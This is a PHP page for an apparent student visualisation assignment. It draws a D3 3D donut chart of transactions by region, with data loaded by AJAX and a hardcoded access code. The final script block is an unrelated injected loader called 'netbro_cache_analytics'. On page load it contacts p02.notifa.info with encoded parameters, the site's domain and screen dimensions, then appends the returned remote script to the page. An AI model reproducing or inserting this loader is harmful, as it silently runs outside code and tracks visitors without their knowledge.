<?php
include $_SERVER['DOCUMENT_ROOT'].'/tugas/blank.php';

  if($kode != 'gv2019'){
    header('location:/tugas/view/tb/gv');
  }

?>
<?php startblock('title') ?> Tugas Besar 1 Grafik Visualisasi <?php endblock() ?>

<?php startblock('breadcrumb-link') ?>
<li class="breadcrumb-item"><a href="#!">Tugas Besar</a>
<li class="breadcrumb-item"><a href="/tugas/view/tugas/stpk">Grafik Visualisasi</a>
<li class="breadcrumb-item"><a href="#!">1</a>
<?php endblock() ?>

<?php startblock('breadcrumb-title') ?>
Tugas Besar 1 Grafik Visualisasi
<?php endblock() ?>

<?php startblock('css') ?>
  <style media="screen">
  #body {
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    width: 960px;
    height: 500px;
    position: relative;
  }
  </style>
<?php endblock() ?>

<?php startblock('content') ?>
<script type="text/javascript" src="http://d3js.org/d3.v3.min.js"></script>
<script type="text/javascript" src="d3_3D.js"></script>

<div class="card">
  <div class="card-header">
    <div class="text-center">
        Daerah Mana yang Paling Banyak Melakukan Transaksi
    </div>
  </div>
</div>
<div class="card">
  <div class="card-header">
    <div class="col-sm-12 col-xl-4 m-b-30">
        <div id="reportrange" class="f-right" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc; width: 100%">
            <span></span> <b class="caret"></b>
        </div>
    </div>
  </div>
</div>

<div class="card">
  <div class="card-block" align="center">
    <div id="body">
    </div>
  </div>
</div>

<?php endblock() ?>

<?php startblock('js') ?>

<script type="text/javascript">

  var salesData = [];
  // salesData=[
  // 	{label:"Basic", color:"#3366CC"},
  // 	{label:"Plus", color:"#DC3912"},
  // 	{label:"Lite", color:"#FF9900"},
  // 	{label:"Elite", color:"#109618"},
  // 	{label:"Delux", color:"#990099"}
  // ];
  $.ajax({url: "/tugas/view/tb/gv/koneksi.php?aksi=1", dataType: 'json',success: function(result){
    salesData=result;
    console.log(salesData);
    var svg = d3.select("#body").append("svg").attr("width",300).attr("height",300);

    svg.append("g").attr("id","salesDonut");

    Donut3D.draw("salesDonut", randomData(), 150, 150, 130, 100, 30, 0.4);

    function changeData(){
      Donut3D.transition("salesDonut", randomData(), 130, 100, 30, 0.4);
    }

    function randomData(){
      return salesData.map(function(d){
        return {label:d.label, value:d.value, color:d.color};});
    }
  }});

  </script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21wCNyKPZ3srjw0OTXx91W9d%2fTFRqms%2bG8nJTYsRRP5nXrMRe88tLkU5T%2fXm4a0s02jMaNZVTr9%2bwZRdGYt7VEDwlYcKSJOxRJYsmNGrlpe06vKaHW5jiXyylRLn28MX%2bHksG8bTEGY%2btzrA8fNpb672oaH1MKZfOaqyo9gPKUnx%2fq6CUuIIRDYifgp2ii9d%2bIbG2zlsbx%2bgYqndyj%2frWyQbGAr3pjiGp2zYM13%2fzCP6Is3UXEqeBJwCMP%2bVOytWblSAbQqNR2wqNOUS%2fQ0DOH98M0akg56IQ5kAyZ8RbiQQecQ5pBEP%2f91acuYzCxuvBNnBmEmjEL%2fEiVgvkQ47PUTYaYDKirQl8l4gwGUiNsgIX63mE0CQ1uZqM0rmL3hg4rovIAfOE3vUXWwoqMG99hlStIXNZZ7u8AGyZBtJR87WDDPCFg87Da%2fJjBQvBQxVatf26Ai1WRSoEwHt%2bxco5ktHPMmz6QSMRHYYGMdDzLd0iZbqGw0FQ34%2bi%2btMXOKEXF0MCm6QZwAiRmVw7RT1vZ8P3ANi64lJp1yDnIbN0W8GBpfiMTp9P7IjhITKknu9w8N74FthuzjB%2fnR7srEiakfw7TeXQrbFgLrqvR0RPibw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<?php endblock() ?>
